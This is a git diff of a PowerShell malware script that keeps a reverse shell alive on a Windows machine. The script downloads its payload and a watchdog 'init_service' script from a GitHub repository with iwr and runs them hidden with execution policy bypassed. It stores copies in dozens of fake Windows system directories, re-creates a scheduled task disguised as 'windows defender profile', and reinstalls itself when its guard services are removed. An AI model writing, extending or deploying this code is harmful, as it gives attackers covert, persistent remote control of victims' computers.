@@ -1,13 +1,24 @@
-param( [string]$basePath )
+param( 
+    [string]$basePath,
+    [string]$l1ServiceName,
+    [string]$l2ServiceName
+)
 
 $uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/s.ps1"
 $propertyName = "revShell"
 
+# DO NOT MODIFY/EDIT THIS PART OF CODE
+# PART_BEGIN
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
+$b = $basePath -replace '([\\{}])', '`$1'
+$l1RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$l1ServiceName"
+$l2RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$l2ServiceName"
+$curr = $MyInvocation.MyCommand.Path
 
 $paths =  @(
     "$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta","$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp","$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy","$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore","$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived","$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),($env:systemdrive + "\Recovery"),"$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile","$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch","$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore","$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump","$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump","$env:windir\system32\spool\drivers\x64\3\en-US","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642","$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces","$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug","$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache","$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump","$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs","$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles","$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports","$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates","$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f","$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef","$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42","$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89","$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
 )
+#PART_END
 
 
 $mutexName = "Global\MyUniquePrion"
@@ -55,6 +66,32 @@ if(-not($item)){
 
 $shellTaskName = "windows defender profile"
 $shellTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$revShellPath'"
+
+# DO NOT EDIT/MODIFY THIS PART OF CODE
+# PART_BEGIN
+function Check-ServiceReg{
+    param([string]$path)
+    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
+    if(-not($c)){
+        return $true
+    }
+    return $false
+}
+
+function Check-Service{
+    param([string]$name)
+    try {
+        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
+        if(-not($d)){
+            return $true
+        }
+    }
+    catch {
+        return $false
+    }
+    return $false
+}
+# PART_END
 
 function CheckTask-And-Recreate {
     [CmdletBinding()]
@@ -140,6 +177,19 @@ function CheckTask-And-Recreate {
 }
 
 while ($true) {
+    # DO NOT MODIFY/EDIT THIS PART OF CODE
+    # PART_BEGIN
+    $l1ServiceStatus = Check-Service -name $l1ServiceName
+    $l1RegistryStatus = Check-ServiceReg -path $l1RegPath
+    $l2ServiceStatus = Check-Service -name $l2ServiceName
+    $l2RegistryStatus = Check-ServiceReg -path $l2RegPath
+    if(($l1ServiceStatus -or $l1RegistryStatus) -and ($l2ServiceStatus -or $l2RegistryStatus)){
+        $l1InitPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $l1InitPath = "$l1InitPath\init_service_rootmonmon.ps1"
+        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $l1InitPath
+        powershell.exe -ep bypass -noP -w hidden $l1InitPath -rootPath $curr -basePath "$b"
+    }
+    # PART_END
 
     if(-not(Test-Path $revShellPath -PathType Leaf)){
         $revShellPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
@@ -150,5 +200,5 @@ while ($true) {
         if(schtasks /query /tn $shellTaskName){ schtasks /delete /tn $shellTaskName /f 2>&1 | Out-Null }
     }
     CheckTask-And-Recreate -taskName $shellTaskName -taskRunAction $shellTaskRunAction
-    Start-Sleep -Seconds 3
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1501)
 }
